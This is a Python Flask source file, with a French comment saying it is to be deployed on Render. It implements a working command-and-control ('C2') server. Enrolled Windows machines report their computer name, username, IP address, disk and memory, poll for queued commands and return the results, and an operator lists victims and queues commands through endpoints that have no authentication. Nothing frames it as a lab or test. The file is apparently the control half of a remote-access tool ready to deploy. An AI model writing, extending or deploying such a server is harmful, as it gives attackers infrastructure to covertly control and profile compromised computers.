# server.py (à déployer sur Render)
import os
import sqlite3
import json
import datetime
from flask import Flask, request, jsonify
from functools import wraps

app = Flask(__name__)
DATABASE = 'c2_clients.db'

def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (
        machine_id TEXT PRIMARY KEY,
        computer_name TEXT,
        username TEXT,
        windows_version TEXT,
        ip TEXT,
        last_seen TIMESTAMP,
        token TEXT,
        disk_total INTEGER,
        disk_free INTEGER,
        ram_total INTEGER,
        ram_available INTEGER,
        status TEXT DEFAULT 'active'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        machine_id TEXT,
        command_type TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP,
        executed_at TIMESTAMP,
        result TEXT,
        FOREIGN KEY(machine_id) REFERENCES clients(machine_id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def generate_token(machine_id):
    import hashlib
    secret = os.environ.get('SECRET_KEY', 'change_me')
    return hashlib.sha256(f"{machine_id}{secret}{datetime.datetime.now()}".encode()).hexdigest()[:32]

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    if not data or 'machine_id' not in data:
        return jsonify({'error': 'missing machine_id'}), 400
    machine_id = data['machine_id']
    conn = get_db()
    cur = conn.execute('SELECT * FROM clients WHERE machine_id = ?', (machine_id,))
    client = cur.fetchone()
    token = generate_token(machine_id) if not client else client['token']
    conn.execute('''INSERT OR REPLACE INTO clients 
        (machine_id, computer_name, username, windows_version, ip, last_seen, token,
         disk_total, disk_free, ram_total, ram_available, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (machine_id, data.get('computer_name'), data.get('username'), data.get('windows_version'),
         data.get('ip'), datetime.datetime.now(), token,
         data.get('disk', {}).get('total'), data.get('disk', {}).get('free'),
         data.get('ram', {}).get('total'), data.get('ram', {}).get('available'), 'active'))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok', 'token': token})

@app.route('/api/commands/<machine_id>', methods=['GET'])
def get_commands(machine_id):
    auth = request.headers.get('Authorization')
    if not auth or not auth.startswith('Bearer '):
        return jsonify({'error': 'unauthorized'}), 401
    token = auth.split(' ')[1]
    conn = get_db()
    cur = conn.execute('SELECT token FROM clients WHERE machine_id = ?', (machine_id,))
    row = cur.fetchone()
    if not row or row['token'] != token:
        conn.close()
        return jsonify({'error': 'invalid token'}), 401
    cur = conn.execute('SELECT id, command_type, params FROM commands WHERE machine_id = ? AND status = "pending" ORDER BY created_at ASC', (machine_id,))
    commands = [{'id': r['id'], 'type': r['command_type'], 'params': json.loads(r['params']) if r['params'] else {}} for r in cur.fetchall()]
    conn.close()
    return jsonify({'commands': commands})

@app.route('/api/command_result', methods=['POST'])
def command_result():
    data = request.get_json()
    if not data or 'machine_id' not in data or 'command_id' not in data:
        return jsonify({'error': 'missing fields'}), 400
    machine_id = data['machine_id']
    command_id = data['command_id']
    result = data.get('result')
    conn = get_db()
    conn.execute('UPDATE commands SET status = "executed", executed_at = ?, result = ? WHERE id = ?',
                 (datetime.datetime.now(), json.dumps(result), command_id))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    conn = get_db()
    cur = conn.execute('SELECT machine_id, computer_name, username, windows_version, ip, last_seen, status FROM clients ORDER BY last_seen DESC')
    clients = [dict(r) for r in cur.fetchall()]
    conn.close()
    return jsonify(clients)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    if not data or 'machine_id' not in data or 'command_type' not in data:
        return jsonify({'error': 'missing fields'}), 400
    machine_id = data['machine_id']
    command_type = data['command_type']
    params = data.get('params', {})
    conn = get_db()
    cur = conn.execute('SELECT machine_id FROM clients WHERE machine_id = ?', (machine_id,))
    if not cur.fetchone():
        conn.close()
        return jsonify({'error': 'client not found'}), 404
    conn.execute('INSERT INTO commands (machine_id, command_type, params, created_at, status) VALUES (?, ?, ?, ?, "pending")',
                 (machine_id, command_type, json.dumps(params), datetime.datetime.now()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'command queued'})

@app.route('/')
def index():
    return '<h1>C2 Server Online</h1><p>Endpoints: /api/heartbeat, /api/commands/&lt;id&gt;, /api/command_result, /api/clients, /api/send_command</p>'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)